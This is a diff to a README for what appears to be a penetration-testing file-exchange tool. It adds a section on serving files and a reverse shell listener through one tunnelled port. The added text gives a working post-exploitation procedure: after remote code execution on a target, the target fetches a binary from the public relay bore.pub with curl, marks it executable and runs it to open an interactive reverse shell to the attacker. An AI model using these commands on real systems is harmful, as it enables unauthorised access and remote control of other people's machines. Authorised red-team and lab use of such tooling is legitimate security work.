@@ -32,16 +32,40 @@ gtrbidi.docker
 * Increase considerably the number of http requests on target
 
 ## Multiplexing & Port forwarding
-> ***- Why?**
-> - To expose my http file exchange server + reverse shell listener on the same port
+> ***- Why?***
+> 
+>\- To expose my http file exchange server + reverse shell listener on the same port
 
+*useful when paired with a tunnel to localhost (as with free version you often have only 1 port/tunnel at a time)*
 
-It is useful when paired with a tunnel to localhost *(as with free version you often have only 1 port/tunnel at a time)*
+Suppose:
+ * you use [`bore`](https://github.com/ekzhang/bore) to perform localhost tunneling
+ * you have RCE on remote target
+ * Target -> Attacker is not possible but Target -> Internet -> Attacker is
 
+If you want an **interactive** reverse shell you may think about [`tacos`](https://github.com/ariary/tacos).
 
+You need to download it on target. Then execute it.
 
+**BUT** HTTP server port and reverse shell listening port are not the same so tunneling only 1 local port won't work.
 
+Now you can! Here is the procedure:
+```shell
+# On attacker
+## First tab, port tunneling
+bore local 9292 --to bore.pub
 
+## Second tab, launch gitar (serve tacos of course)
+gitar -e bore.pub -p [BORE_PORT] -f 4444 -s demo
+
+# On target
+## Retrieve tacos binary
+curl https://bore.pub:[BORE_PORT]/demo/pull/tacos
+## Shutdown gitar http server (⇒ local port forwarding activated)
+curl https://bore.pub:[BORE_PORT]/demo/shutdown
+## Execute tacos to get interactive reverse shell
+chmod +x tacos && ./tacos bore.pub:[BORE_PORT]
+```
 
 ## Load shortcut directly in your bind shell
 
